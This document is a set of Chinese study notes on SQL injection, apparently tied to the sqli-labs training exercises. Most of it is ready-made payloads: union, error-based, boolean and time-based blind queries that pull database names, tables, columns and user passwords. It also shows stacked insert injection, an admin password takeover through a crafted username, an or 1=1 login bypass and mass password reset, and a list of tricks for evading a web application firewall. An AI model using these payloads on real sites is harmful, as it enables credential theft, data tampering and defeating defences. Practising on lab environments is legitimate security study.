## 原理：

```
/*
//查
$sql = "SELECT * FROM table1 WHERE id < 4";

//执行sql语句并且结果返回到$result
$result = $con->query($sql);

//判断一下result里是否有数据
if($result->num_rows>0){
	//把$result里的数据一条一条给$row
	while($row=$result->fetch_assoc()){
		echo $row['username'].'-----'.$row['password'].'<br/>';
	}
}
*/

/*
//增
$sql = "INSERT INTO table1(id,username,password) VALUES(21,'test1','ttttttt')";

if($con->query($sql)===TRUE){
	echo '执行成功！！！！';
}else{
	echo '执行失败xxxx'.$con->error;
}
*/

/*
//改
$sql = "UPDATE table1 SET password='niubi' WHERE username='xiaohong'";

if($con->query($sql)===TRUE){
	echo '执行成功！！！！';
}else{
	echo '执行失败xxxx'.$con->error;
}
*/

//删
$sql = "DELETE FROM table1 WHERE id=21";
if($con->query($sql)===TRUE){
	echo '执行成功！！！！';
}else{
	echo '执行失败xxxx'.$con->error;
}
```



# GET

#### 注意：

​		information中不是_是.

​		select 不能少

​		substr()的运用（’  ‘，1，1）

​		嵌套函数的运用

#### 其他：

​		可以用group_concat()输出全部信息

​		可以用limit [序列],1 一个一个输出，序列从0开始

​		完成闭合或无效化之后命令

​				注释：# --+ /**/

​		0x3a:

​		0x7e~

1.判断运用哪种（增删改查）

目的：（查-获取数据库信息）

2.注入方式 

普通、报错、布尔、时间

报错：返回错误信息

​		利用rand()漏洞

布尔：返回登录是否成功

​		利用与（and）命令

时间：什么都不返回

​		利用Ture时的时延

3.闭合方式

‘ ” ） ’） “）无

4.判断column数量

order by [num]

5.收集数据库名

database()

```
普通：union select [id],[用户名]，database()
```

```
报错：(select 1 from (select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b)

extractvalue(1,concat(0x7e,(select database()),0x7e))

updatexml(1,concat(0x7e,(select database()),0x7e),1)
```

```
布尔：and (select length(database())<10) #判断databace长度
and (select ascii(substr(database(),1,1)) > 100 )#判断每个字母的asicc码
```

```
时间：and if((select length(database()))=8,sleep(5),null)
and if((select ascii(substr(database(),1,1)))>0,sleep(5),null)
```

6.收集表名table_name

from information_schema.tables where table_schema="[数据库名]"

```
普通：union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="[数据库名]"
```

```
报错：(select 1 from (select count(*),concat(0x3a,0x3a,(select group_concat(table_name)from information_schema.tables where table_schema="[数据库名]"),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b)

extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema="[数据库名]"),0x7e))

updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema="[数据库名]"),0x7e),1)
```

```
布尔：and (select length(table_name) =6 from information_schema.tables where table_schema=database() limit 0,1)
and (select ascii(substr(table_name,1,1)) >0 from information_schema.tables where table_schema=database() limit 0,1)
```

```
时间：and if((select length(table_name) =6 from information_schema.tables where table_schema=database() limit 0,1),sleep(5),null)
and if((select ascii(substr(table_name,1,1)) >0 from information_schema.tables where table_schema=database() limit 0,1),sleep(5),null)
```

7.收集栏目column_name

from information_schema.columns where table_schema="[数据库名]" and table_name="[表名]"

```
普通：union select 1,2,group_concat(column_name) from information_schema.columns where table_schema="[数据库名]" and table_name="[表名]"
```

```
报错：(select 1 from (select count(*),concat(0x3a,0x3a,(select group_concat(column_name)from information_schema.columns where table_schema="[数据库名]” and table_name="[表名]"),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b)

extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema="[数据库名]” and table_name="[表名]")，0x7e))

updatexml(1,concat(0x7e,(select database()),0x7e),1)
```

```
布尔：and (select length(column_name) =2 from information_schema.columns where table_schema=database() and table_name="[表名]" limit 0,1)
and (select ascii(substr(column_name,1,1)) >0 from information_schema.columns where table_schema=database() and table_name="[表名]" limit 0,1)
```

```
时间：and if((select length(column_name) =2 from information_schema.columns where table_schema=database() and table_name="[表名]" limit 0,1),sleep(5),null)
and if((select ascii(substr(column_name,1,1)) >0 from information_schema.columns where table_schema=database() and table_name="[表名]" limit 0,1),sleep(5),null)
```

(6)收集信息table_name/column_name

from information_schema.columns where table_schema="[数据库名]"

8.利用column和表名获取用户名、密码

from [表名]

```
普通：union select 1,group_concat(username),group_concat(password) from users
```

```
报错：(select 1 from (select count(*),concat(0x3a,0x3a,(select group_concat(用户名/密码)from [表名]),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b)

extractvalue(1,concat(0x7e,(select group_concat(用户名/密码)from [表名]),0x7e)

updatexml(1,concat(0x7e,(select group_concat(用户名/密码)from [表名]),0x7e),1)
```

```
布尔：and (select length([用户名/密码]) =6 from [表名] limit 0,1)
and (select ascii(substr(username,1,1)) >0 from users limit 0,1)
```

```
时间：and if((select length([用户名/密码]) =6 from [表名] limit 0,1),sleep(5),null)
and if((select ascii(substr(username,1,1)) >0 from users limit 0,1),sleep(5),null)
```

==========

越权漏洞

```
$new_pass1 = $_POST['new_pass1'];
$new_pass2 = $_POST['new_pass2'];
if($new_pass1 == $new_pass2){

update users set password='123' where username=' admin' # ' and password='$old_pass';

}
```

当可以注册用户的时候，我们思考一下能不能通过自己修改密码去修改别人的密码
越权
新注册一个用户名admin' # 密码随意
那么修改这个用户名的密码的时候，其实是修改admin用户的密码

============

堆叠注入

加一条
补全闭合方式之后，使用;，在前一句执行完后执行后一句

/Less-38/?id=2';insert into users(id,username,password) values(99,'zjzj','hahaha') --+

============

------

# POST

#### 注意：

​		处理好and or 的关系

#### 其他：

​		可能有base64加密等

#### 目的：

##### 	通用密码：

​		1.闭合方式

​			\可查看会出现报错信息的

​			利用sleep()猜测闭合方式

​		2.利用or使命令通过

​			or 1=1

##### 	修改密码（危害性很大，不建议做）

​		1.利用or将数据库所有用户的密码改为1

​			or 1=1

##### 	查看数据库信息

​		1.查看情况

​		页面显示(user-agent,referer等）

​		2.判断是查还是增

​		3.刺探数据的步骤同GET

​		' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1

# 绕过安全狗（防火墙）

```
1.大小写绕过
UniOn SelEct

2.双写绕过
uniunionon selselectect

3.编码绕过
'security' === 0x7365637572697479

4.注释符
un/**/ion sel/**/ect

5.空格绕过

%09（水平tab键）%09 (水平tab键）%0a (新建一行)%0c (新建一页)%0d (回车键)%0b (垂直tab键)%a0 (也可以是空格键)[大多数情况用]

6.or and绕过
and == &&
or == ||

7.内联函数
/*!select*/ 1,2,3

8.<>绕过
un<>ion sel<>ect

9.屏蔽逗号
select substr("security",1,3);
select substr("security" from 1 for 3);

union select 1,2,3
union select * from (select 1)a join (select 2)b join (select 3)c;

limit 0,1
limit 0 offset 1

10.sleep屏蔽
and sleep(1)
and benchmark(100000000,1)

11.group_concat屏蔽
select group_concat('x','y');
select concat_ws('','x','y');

12.=屏蔽
使用like rlike regexp <>
id=1' or '1' like '1

13.POST屏蔽#
考虑使用 --空格a 大部分情况用来当空格用的
uname=admin -- a&passwd=admin

14.标点会被自动加\

可用%bf或%df%或%aa（国内）

原理：%bf%5c在机器认为是中国汉字
```

